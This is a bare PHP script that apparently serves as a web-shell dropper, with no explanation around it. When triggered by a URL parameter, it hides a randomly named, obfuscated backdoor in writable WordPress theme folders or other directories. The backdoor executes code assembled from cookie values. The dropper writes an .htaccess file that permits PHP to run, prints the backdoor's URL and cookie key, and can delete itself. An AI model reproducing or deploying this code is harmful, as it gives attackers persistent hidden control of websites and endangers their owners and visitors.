<?php
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(E_ALL);
function get_dir()
{
    error_reporting(0);
    $glob = glob('*', GLOB_ONLYDIR);
    $dir = (is_array($glob) && !empty($glob) && ($glob_filtered = array_filter($glob, 'is_writable'))) ? $glob_filtered[array_rand($glob_filtered)] : false;
    return $dir;
}
if ($_GET['imam'] == 'doit') {
    $key_store = [];
    $arr_length = rand(20, 30);
    while (true) {

        $k = rand(4, $arr_length - 2);

        if (!in_array($k, $key_store)) {
            $key_store[] = $k;
        }

        if (count($key_store) == 5) {
            $key_store[5] = $arr_length;
            break;
        }
    }
    $spass = implode('-', $key_store);

    $mn = substr(md5(microtime()), rand(0, 20), 7);
    $htfile = "<Files *.php>\nOrder allow,deny\nAllow from all\n</Files>";
    $sbody = '<?php $p=$_COOKIE;(count($p)=='
        . $key_store[5] . '&&in_array(gettype($p).count($p),$p))?(($p['
        . $key_store[1] . ']=$p[' . $key_store[1] . '].$p['
        . $key_store[2] . '])&&($p[' . $key_store[3] . ']=$p['
        . $key_store[1] . ']($p[' . $key_store[3] . ']))&&($p=$p['
        . $key_store[3] . ']($p[' . $key_store[0] . '],$p['
        . $key_store[1] . ']($p[' . $key_store[4] . '])))&&$p()):$p;';

    if (file_exists('wp-content')) {
        @chdir('wp-content');
        @chdir('themes');
        $mydir1 = get_dir();
        @chdir($mydir1);
        $mydir2 = get_dir();
        @chdir($mydir2);
        $f = fopen($mn . '.php', 'w');
        fwrite($f, $sbody);
        fclose($f);
        $file = fopen(".htaccess", "w+");
        $write = fwrite($file, $htfile);
        fclose($file);
        $link = 'http://' . $_SERVER['HTTP_HOST'] . rtrim(dirname($_SERVER['REQUEST_URI']), '\\/') . '/wp-content/themes/' . $mydir1 . '/' . $mydir2 . '/' . $mn . '.php   ' . $spass;
    } else {
        $mydir3 = get_dir();
        @chdir($mydir3);
        $mydir4 = get_dir($mydir4);
        @chdir($mydir4);
        $mydir5 = get_dir();
        @chdir($mydir5);
        $f = fopen($mn . '.php', 'w');
        fwrite($f, $sbody);
        fclose($f);
        $file = fopen(".htaccess", "w+");
        $write = fwrite($file, $htfile);
        fclose($file);
        $link = 'http://' . $_SERVER['HTTP_HOST'] . rtrim(dirname($_SERVER['REQUEST_URI']), '\\/') . '/' . $mydir3 . '/' . $mydir4 . '/' . $mydir5 . '/' . $mn . '.php   ' . $spass;
    }

    echo "\n" . $link . "\n";

}


echo $link;
//$file=fopen(__FILE__ ,'w');
//fclose($file);
if ($_GET['imam'] == 'unlink') {
    unlink(__FILE__);
}
if ($_GET['imam'] == 'test') {
    echo "<title>imambro</title>";
}

?>